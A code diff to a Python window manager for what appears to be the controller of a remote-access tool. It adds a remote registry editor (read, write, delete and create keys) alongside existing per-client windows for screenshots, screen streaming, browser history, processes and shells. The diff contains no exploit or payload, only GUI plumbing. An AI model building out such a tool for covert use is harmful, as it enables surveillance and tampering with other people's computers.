@@ -25,6 +25,7 @@ class WindowManager:
         self.screen_stream_windows = {}
         self.browser_history_windows = {}  # Novo dicionário para janelas de histórico
         self.closing_windows = set()
+        self.registry_windows = {}
     def display_screenshot(self, client_address, screenshot_data):
         client_key = f"{client_address[0]}:{client_address[1]}"
         if client_key in self.closing_windows:
@@ -375,6 +376,15 @@ class WindowManager:
                     except:
                         pass
             self.browser_history_windows.clear()
+        if hasattr(self, 'registry_windows'):
+            for client_key, window_info in list(self.registry_windows.items()):
+                if "window" in window_info and hasattr(window_info["window"], "winfo_exists"):
+                    try:
+                        if window_info["window"].winfo_exists():
+                            window_info["window"].destroy()
+                    except:
+                        pass
+            self.registry_windows.clear()
         self.screenshot_windows.clear()
         self.process_windows.clear()
         self.shell_windows.clear()
@@ -533,3 +543,147 @@ class WindowManager:
                 self.server.log(f"Método de processamento de histórico não encontrado para {client_key}")
         except Exception as e:
             self.server.log(f"Erro ao processar resposta de histórico: {str(e)}")
+    def open_registry_window(self, client_address):
+        client_key = f"{client_address[0]}:{client_address[1]}"
+        if client_key in self.closing_windows:
+            self.server.log(f"Removing {client_key} from closing list to allow new registry editor")
+            self.closing_windows.discard(client_key)
+        if client_key in self.registry_windows:
+            window_info = self.registry_windows[client_key]
+            if "window" in window_info and hasattr(window_info["window"], "winfo_exists"):
+                try:
+                    if window_info["window"].winfo_exists():
+                        window_info["window"].focus_set()
+                        return window_info["window"]
+                except:
+                    pass
+        try:
+            from gui.registry_view import RegistryWindow
+            registry_window = RegistryWindow(
+                self.main_window,
+                client_address,
+                client_key,
+                self.server,
+                self.server.log
+            )
+            self.registry_windows[client_key] = {
+                "window": registry_window.window,
+                "process_registry_list_response": registry_window.process_registry_list_response,
+                "process_registry_read_response": registry_window.process_registry_read_response,
+                "process_registry_write_response": registry_window.process_registry_write_response,
+                "process_registry_delete_value_response": registry_window.process_registry_delete_value_response,
+                "process_registry_create_key_response": registry_window.process_registry_create_key_response,
+                "process_registry_delete_key_response": registry_window.process_registry_delete_key_response
+            }
+            return registry_window.window
+        except Exception as e:
+            self.server.log(f"Error creating registry window: {str(e)}")
+            return None
+    def process_registry_list_response(self, client_address, data):
+        client_key = f"{client_address[0]}:{client_address[1]}"
+        if client_key in self.closing_windows:
+            return
+        registry_exists = False
+        registry_window = None
+        if client_key in self.registry_windows:
+            window_info = self.registry_windows[client_key]
+            if "window" in window_info and hasattr(window_info["window"], "winfo_exists"):
+                try:
+                    if window_info["window"].winfo_exists():
+                        registry_exists = True
+                        registry_window = window_info
+                except:
+                    pass
+        if not registry_exists:
+            try:
+                window = self.open_registry_window(client_address)
+                if window and client_key in self.registry_windows:
+                    registry_window = self.registry_windows[client_key]
+                    registry_exists = True
+            except:
+                pass
+        if not registry_exists:
+            self.server.log(f"Received registry response for {client_key}, but no window was found")
+            return
+        try:
+            if "process_registry_list_response" in registry_window and callable(registry_window["process_registry_list_response"]):
+                registry_window["process_registry_list_response"](data)
+            else:
+                self.server.log(f"Registry list processing method not found for {client_key}")
+        except Exception as e:
+            self.server.log(f"Error processing registry list response: {str(e)}")
+    def process_registry_read_response(self, client_address, data):
+        client_key = f"{client_address[0]}:{client_address[1]}"
+        if client_key in self.closing_windows:
+            return
+        if client_key not in self.registry_windows:
+            self.server.log(f"Received registry read response for {client_key}, but no window was found")
+            return
+        window_info = self.registry_windows[client_key]
+        try:
+            if "process_registry_read_response" in window_info and callable(window_info["process_registry_read_response"]):
+                window_info["process_registry_read_response"](data)
+            else:
+                self.server.log(f"Registry read processing method not found for {client_key}")
+        except Exception as e:
+            self.server.log(f"Error processing registry read response: {str(e)}")
+    def process_registry_write_response(self, client_address, data):
+        client_key = f"{client_address[0]}:{client_address[1]}"
+        if client_key in self.closing_windows:
+            return
+        if client_key not in self.registry_windows:
+            self.server.log(f"Received registry write response for {client_key}, but no window was found")
+            return
+        window_info = self.registry_windows[client_key]
+        try:
+            if "process_registry_write_response" in window_info and callable(window_info["process_registry_write_response"]):
+                window_info["process_registry_write_response"](data)
+            else:
+                self.server.log(f"Registry write processing method not found for {client_key}")
+        except Exception as e:
+            self.server.log(f"Error processing registry write response: {str(e)}")
+    def process_registry_delete_value_response(self, client_address, data):
+        client_key = f"{client_address[0]}:{client_address[1]}"
+        if client_key in self.closing_windows:
+            return
+        if client_key not in self.registry_windows:
+            self.server.log(f"Received registry delete value response for {client_key}, but no window was found")
+            return
+        window_info = self.registry_windows[client_key]
+        try:
+            if "process_registry_delete_value_response" in window_info and callable(window_info["process_registry_delete_value_response"]):
+                window_info["process_registry_delete_value_response"](data)
+            else:
+                self.server.log(f"Registry delete value processing method not found for {client_key}")
+        except Exception as e:
+            self.server.log(f"Error processing registry delete value response: {str(e)}")
+    def process_registry_create_key_response(self, client_address, data):
+        client_key = f"{client_address[0]}:{client_address[1]}"
+        if client_key in self.closing_windows:
+            return
+        if client_key not in self.registry_windows:
+            self.server.log(f"Received registry create key response for {client_key}, but no window was found")
+            return
+        window_info = self.registry_windows[client_key]
+        try:
+            if "process_registry_create_key_response" in window_info and callable(window_info["process_registry_create_key_response"]):
+                window_info["process_registry_create_key_response"](data)
+            else:
+                self.server.log(f"Registry create key processing method not found for {client_key}")
+        except Exception as e:
+            self.server.log(f"Error processing registry create key response: {str(e)}")
+    def process_registry_delete_key_response(self, client_address, data):
+        client_key = f"{client_address[0]}:{client_address[1]}"
+        if client_key in self.closing_windows:
+            return
+        if client_key not in self.registry_windows:
+            self.server.log(f"Received registry delete key response for {client_key}, but no window was found")
+            return
+        window_info = self.registry_windows[client_key]
+        try:
+            if "process_registry_delete_key_response" in window_info and callable(window_info["process_registry_delete_key_response"]):
+                window_info["process_registry_delete_key_response"](data)
+            else:
+                self.server.log(f"Registry delete key processing method not found for {client_key}")
+        except Exception as e:
+            self.server.log(f"Error processing registry delete key response: {str(e)}")
